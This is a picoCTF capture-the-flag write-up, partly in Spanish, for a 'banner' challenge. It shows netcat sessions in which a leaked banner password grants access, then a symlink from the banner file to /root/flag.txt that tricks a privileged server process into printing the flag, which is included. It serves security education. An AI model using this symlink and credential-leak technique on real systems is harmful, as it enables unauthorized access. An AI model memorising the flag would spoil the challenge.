**Challenge**
	
**Description**
	Can you abuse the banner?
	The server has been leaking some crucial information on `tethys.picoctf.net 59079`. Use the leaked information to get to the server.
	To connect to the running application use `nc tethys.picoctf.net 54295`. From the above information abuse the machine and find the flag in the /root directory.
	**Hints**
		1. Do you know about symlinks?
		2. Maybe some small password cracking or guessing

**Solution**
	1. Comandos:
		1. `nc tethys.picoctf.net 59079`
		2. `nc tethys.picoctf.net 54295`
		3. `ls`
		4. `cat banner`
		5. `rm banner`
		6. `ls -al /root`
		7. `ln -s /root/flag.txt banner`
		8. `cat banner`
		9. `nc tethys.picoctf.net 54295`
		10. `Obtención de la bandera`
	2. Usando terminal de picoCTF:
		<script class = "CLI picoCTF">
			Lui5-picoctf@webshell:~$ nc tethys.picoctf.net 59079
			SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
			^C
			Lui5-picoctf@webshell:~$ nc tethys.picoctf.net 54295
			*************************************
			**************WELCOME****************
			*************************************
			
			what is the password? 
			My_Passw@rd_@1234
			What is the top cyber security conference in the world?
			DEF CON
			the first hacker ever was known for phreaking(making free phone calls), who was it?
			John Draper
			player@challenge:~$ ls
			ls
			banner  text
			player@challenge:~$ cat banner
			cat banner
			*************************************
			**************WELCOME****************
			*************************************
			player@challenge:~$ rm banner
			rm banner
			player@challenge:~$ ls -al /root
			ls -al /root
			total 16
			drwxr-xr-x 1 root root    6 Mar 12  2024 .
			drwxr-xr-x 1 root root   41 Mar 20 16:48 ..
			-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
			-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
			-rwx------ 1 root root   46 Mar 12  2024 flag.txt
			-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
			player@challenge:~$ ln -s /root/flag.txt banner
			ln -s /root/flag.txt banner
			player@challenge:~$ cat banner
			cat banner
			cat: banner: Permission denied
			player@challenge:~$ ^C
			Lui5-picoctf@webshell:~$ nc tethys.picoctf.net 54295
			picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
			
			what is the password? 
		</script>

**Notes**
	- **Banner Grabbing:** Identificar correctamente la contraseña `My_Passw@rd_@1234` mediante una fuga de información en el puerto `59079` usando `nc`.
	- **Explotación de Simlinks:** Esta es la parte crítica. Aunque como usuario `player` no se tienen permisos para leer `/root/flag.txt` directamente (como viste al recibir `Permission denied`), el proceso que levanta el servidor y muestra el "banner" al conectarse sí tiene privilegios suficientes.
	- **Persistencia del enlace:** Al ejecutar `ln -s /root/flag.txt banner`, se engaña al script del servidor. La próxima vez que alguien (segunda conexión) se conectara, el programa intentará leer `banner` pero termina leyendo y mostrando el contenido de `flag.txt`.

**References**
	